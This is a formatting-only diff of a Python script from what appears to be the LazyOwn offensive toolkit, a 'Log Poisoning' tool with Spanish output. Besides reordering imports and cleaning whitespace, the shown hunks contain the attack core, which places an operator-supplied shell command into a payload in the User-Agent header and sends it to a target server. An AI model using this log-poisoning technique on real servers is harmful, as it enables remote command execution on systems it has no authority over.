@@ -1,33 +1,33 @@
 #!/usr/bin/env python3
-# _*_ coding: utf8 _*_
 
-import requests
-import signal
 import argparse
-import sys
+import signal
 import subprocess
-import lazyencoder_decoder as ed
+import sys
 
-BANNER = """
-    __    ___              ____                            
-   / /   /   |____  __  __/ __ \_      ______              
-  / /   / /| /_  / / / / / / / / | /| / / __ \             
- / /___/ ___ |/ /_/ /_/ / /_/ /| |/ |/ / / / /             
-/_________ |_/___/\__, /\____/ |__/|__/_/ /_/          __  
+import lazyencoder_decoder as ed
+import requests
+
+BANNER = r"""
+    __    ___              ____
+   / /   /   |____  __  __/ __ \_      ______
+  / /   / /| /_  / / / / / / / / | /| / / __ \
+ / /___/ ___ |/ /_/ /_/ / /_/ /| |/ |/ / / / /
+/_________ |_/___/\__, /\____/ |__/|__/_/ /_/          __
    / ____/_______/_////_ ___  ___ _      ______  _____/ /__
   / /_  / ___/ __ `/ __ `__ \/ _ \ | /| / / __ \/ ___/ //_/
- / __/ / /  / /_/ / / / / / /  __/ |/ |/ / /_/ / /  / ,<   
-/_/ __/_/   \__,_/_/ /_/ /_/\___/|__/|__/\____/_/  /_/|_|  
-   / /   ____  ____ _                                      
-  / /   / __ \/ __ `/                                      
- / /___/ /_/ / /_/ /                                       
-/_____/\____/\__, /                                        
-    ____    /____/ __             _                        
-   / __ \____  (_)/ /____  ____  (_)___  ____ _            
-  / /_/ / __ \/ / __/ __ \/ __ \/ / __ \/ __ `/            
- / ____/ /_/ / (_  ) /_/ / / / / / / / / /_/ /             
-/_/    \____/_/  _/\____/_/ /_/_/_/ /_/\__, /              
-              /_/                     /____/               
+ / __/ / /  / /_/ / / / / / /  __/ |/ |/ / /_/ / /  / ,<
+/_/ __/_/   \__,_/_/ /_/ /_/\___/|__/|__/\____/_/  /_/|_|
+   / /   ____  ____ _
+  / /   / __ \/ __ `/
+ / /___/ /_/ / /_/ /
+/_____/\____/\__, /
+    ____    /____/ __             _
+   / __ \____  (_)/ /____  ____  (_)___  ____ _
+  / /_/ / __ \/ / __/ __ \/ __ \/ / __ \/ __ `/
+ / ____/ /_/ / (_  ) /_/ / / / / / / / / /_/ /
+/_/    \____/_/  _/\____/_/ /_/_/_/ /_/\__, /
+              /_/                     /____/
 [*] Iniciando: LazyOwn Log Poisoning [;,;]
 """
 print(BANNER)
@@ -43,7 +43,7 @@ def ensure_http_prefix(url):
 
 
 def signal_handler(sig: int, frame: any) -> None:
-    print(f"\n[*] Interrupción recibida, saliendo del programa.")
+    print("\n[*] Interrupción recibida, saliendo del programa.")
     sys.exit(0)
 
 
@@ -150,9 +150,9 @@ def main():
     headers = {
         "User-Agent": selected_payload[1].replace("cmd",command)
     }
-    
+
     response = requests.get(url, headers=headers, verify=False, allow_redirects=False)
-    
+
     print(f"\n[*] Ejecutando payload: {selected_payload[0]}")
     print(f"[*] Código de respuesta: {response.status_code}")
     print(f"[*] Respuesta del servidor: {response.text}")
